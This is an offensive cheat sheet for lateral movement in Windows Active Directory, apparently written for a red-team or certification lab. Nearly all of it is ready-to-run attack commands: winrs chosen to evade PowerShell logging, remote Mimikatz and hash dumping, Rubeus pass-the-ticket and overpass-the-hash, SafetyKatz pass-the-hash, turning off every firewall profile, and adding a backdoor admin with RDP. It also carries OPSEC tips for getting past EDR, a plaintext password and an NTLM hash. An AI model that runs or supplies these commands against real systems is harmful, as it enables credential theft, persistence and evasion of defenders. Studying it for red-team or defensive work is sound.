## Winrs
>**ℹ️ Info:**
>We can use winrs in place of PSRemoting to evade the logging (and still reap the benefit of 5985 allowed between hosts).


**With local credentials:**
```cmd
winrs -remote:server1 -u:.\administrator - p:Pass@1234 cmd
```

**With domain credentials:**
```cmd
winrs -remote:server1 -u:contoso.local\administrator - p:Pass@1234 cmd
```
---
## PowerShell Remoting

**Connect to a machine:**
```powershell
Enter-PSSession -Computername <COMPUTERNAME>
```

**Connect to a machine and save the session:**
```powershell
$sess = New-PSSession -Computername <COMPUTERNAME>
Enter-PSSession $sess
```

**Connect to a machine with credentials and save the session:**
```powershell
$passwd = ConvertTo-SecureString 't7HoBF+m]ctv.]' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("us-mailmgmt\administrator", $passwd)
$mailmgmt = New-PSSession -ComputerName us-mailmgmt -Credential $creds
Enter-PSSession $mailmgmt
```

**Load script to a machine:**
```powershell
Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $sess
```

**Execute command or scriptblock:**
```powershell
Invoke-Command –Scriptblock ${function:Get-PassHashes} -Session $sess
```

**Execute locally loaded function to a machine:**
```powershell
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -Session $sess -ArgumentList
```

--- 
## Pass-The-Ticket
Injects a TGT into the current session to impersonate the owner of it

### Rubeus
**Inject TGT into current session:**
```cmd
Rubeus.exe ptt /ticket:doIFsjCCBa6gAwIBBaEDAgEWooI...
```

>**ℹ️ Info:**
>More OPSEC-friendly than OverPass-The-Hash since we are reusing a TGT instead of asking for a new one.

---
## Pass-The-Hash
Use a NTLM hash to authenticate against NTLM.
### SafetyKatz

**Spawn a cmd session:**
```cmd
SafetyKatz.exe '"sekurlsa::pth /domain:contoso.local /user:Administrator /ntlm:917ecdd1b4287f7051542d0241900cf0"'
```

**Spawn a powershell session:**
```cmd
SafetyKatz.exe '"sekurlsa::pth /domain:contoso.local /user:Administrator /ntlm:917ecdd1b4287f7051542d0241900cf0 /run:powershell.exe"'
```

---
## OverPass-The-Hash
Use a NTLM hash or AES key to authenticate against kerberos.

### Rubeus

**With an NTLM hash (Usually flagged by EDRs):**
```cmd
Rubeus.exe asktgt /domain:contoso.local /user:administrator /rc4: /ptt
```

**With an AES-128 key (Admin cmd required):**
```cmd
Rubeus.exe asktgt /domain:contoso.local /user:administrator /aes128: /ptt
```

**With an AES-256 key (Admin cmd required):**
```cmd
Rubeus.exe asktgt /domain:contoso.local /user:administrator /aes256: /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

>**ℹ️ Info:**
>AES-256 key is more OPSEC-friendly than the others.

---
## RunAs

**Run network related stuff with password:**
```cmd
runas /netonly /user:techcorp.local\MSOL_16fb75d0227d cmd.exe
```

## Firewall

**Disable firewall:**
```cmd
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

powershell.exe -c 'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False'
```

## RDP

**Add user to local admin and RDP group and enable RDP on firewall:**
```cmd
net user <USERNAME> <PASSWORD> /add /Y  && net localgroup administrators <USERNAME> /add && net localgroup "Remote Desktop Users" <USERNAME> /add && reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```